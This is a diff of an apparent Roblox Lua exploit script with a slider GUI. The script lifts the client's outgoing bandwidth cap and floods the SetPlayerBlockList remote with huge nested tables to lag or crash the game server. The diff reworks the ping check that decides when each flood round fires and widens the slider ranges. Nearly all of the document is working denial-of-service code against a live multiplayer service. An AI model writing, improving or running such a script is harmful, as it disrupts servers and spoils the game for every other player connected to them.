@@ -34,65 +34,64 @@ b:Slider("bomb value",{
     bombValue = value
 end)
 
--- Defaults to 300, adjust as necessary
-local pingLimit = 300;
-b:Slider("ping limit",{
-    min = 100;
-    max = 500;
+-- Defaults to 500, adjust as necessary
+local maxPing = 500;
+b:Slider("Maximum Ping",{
+    min = 1;
+    max = 1000;
     precise = false;
 },function(value)
-    pingLimit = value
+    maxPing = value
 end)
 
 b:DestroyGui()
 
 while wait(0.6) do
     if toggle then
-        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-        local function getmaxvalue(val)
-            local mainvalueifonetable = 499999
-            if type(val) ~= "number" then
-                return nil
-            end
-            local calculateperfectval = (mainvalueifonetable/(val+2))
-            return calculateperfectval
-        end
-        
-        local function bomb(tableincrease, tries)
-            local maintable = {}
-            local spammedtable = {}
-            
-            table.insert(spammedtable, {})
-            z = spammedtable[1]
-            
-            for i = 1, tableincrease do
-                local tableins = {}
-                table.insert(z, tableins)
-                z = tableins
-            end
-            
-            local calculatemax = getmaxvalue(tableincrease)
-            local maximum
-            
-            if calculatemax then
-                maximum = calculatemax
-            else
-                maximum = 999999
-            end
-            
-            for i = 1, maximum do
-                table.insert(maintable, spammedtable)
-            end
-            
-            for i = 1, tries do
-                local currentPing = game:GetService("NetworkClient"):GetAvgPing()
-                if currentPing > pingLimit then
-                    break
+        local currentPing = game:GetService("NetworkClient").LocalPlayer.Ping
+        if currentPing <= maxPing then
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+            local function getmaxvalue(val)
+                local mainvalueifonetable = 499999
+                if type(val) ~= "number" then
+                    return nil
                 end
-                game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+                local calculateperfectval = (mainvalueifonetable/(val+2))
+                return calculateperfectval
             end
+            
+            local function bomb(tableincrease, tries)
+                local maintable = {}
+                local spammedtable = {}
+                
+                table.insert(spammedtable, {})
+                z = spammedtable[1]
+                
+                for i = 1, tableincrease do
+                    local tableins = {}
+                    table.insert(z, tableins)
+                    z = tableins
+                end
+                
+                local calculatemax = getmaxvalue(tableincrease)
+                local maximum
+                
+                if calculatemax then
+                    maximum = calculatemax
+                else
+                    maximum = 999999
+                end
+                
+                for i = 1, maximum do
+                    table.insert(maintable, spammedtable)
+                end
+                
+                for i = 1, tries do
+                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+                end
+            end
+            
+            bomb(tableValue, bombValue)
         end
-        
-        bomb(tableValue, bombValue)
     end
 end
